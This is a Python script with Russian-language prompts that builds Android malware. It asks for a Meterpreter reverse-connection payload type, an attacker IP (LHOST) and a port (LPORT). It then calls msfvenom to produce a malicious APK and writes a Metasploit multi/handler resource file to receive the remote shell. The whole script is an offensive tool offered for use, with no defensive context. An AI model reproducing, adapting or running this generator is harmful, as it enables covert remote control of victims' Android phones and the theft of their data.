import os
import subprocess
import time

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'
   HEADER = '\033[95m'
   OKBLUE = '\033[94m'
   OKGREEN = '\033[92m'
   WARNING = '\033[93m'
   FAIL = '\033[91m'


try:
    os.system('clear')
    print(color.BOLD+' Выбери тип соединения:'+color.END)
    print(color.BOLD+' Для выхода CTRL + C'+color.END)
    print(color.FAIL+'''
    android/meterpreter/reverse_http

    android/meterpreter/reverse_tcp

    android/meterpreter/reverse_https

    '''+color.END)
    android=input(color.WARNING+'Какой тип соединения использовать будем? '+color.END)
    time.sleep(0.5)
    os.system('clear')
    print(color.DARKCYAN+'Ваш ip'+color.END)
    os.system('wget -qO- ipinfo.io/ip')
    print(color.RED+color.BOLD+'Если вы на Wi-FI, то нужен локальный адрес, который вам дал WI-FI'+color.END)
    lhost=input(color.FAIL+'LHOST: '+color.END)
    print(color.DARKCYAN+'''
          Через какой порт проводить соединения?
          Не используйте 80 и 443 порт, они системные...
    '''+color.END)
    lport=input(color.FAIL+'LPORT: '+color.END)
    time.sleep(0.8)
    apkfile=input(color.GREEN+'Filename apk: '+color.END)
    time.sleep(0.5)
    rc = open('android/config/'+apkfile+'.rc', 'w')
    rc.write('''
use exploit/multi/handler
set PAYLOAD '''+android+'''
set LHOST '''+lhost+'''
set LPORT '''+lport+'''
clear
exploit
    ''')
    txt = open('android/config/config.txt', 'a')
    txt.write(' '+apkfile+'.rc')
    time.sleep(0.8)
    os.system('msfvenom -p '+android+' LHOST='+lhost+' LPORT='+lport+' R > android/'+apkfile+'.apk')
    os.system('clear')
    print(color.GREEN+'android/'+apkfile+'.apk'+color.END)
    rc.close()
    txt.close()
except:
    time.sleep(0.7)
    print(color.FAIL+'Выход...'+color.END)
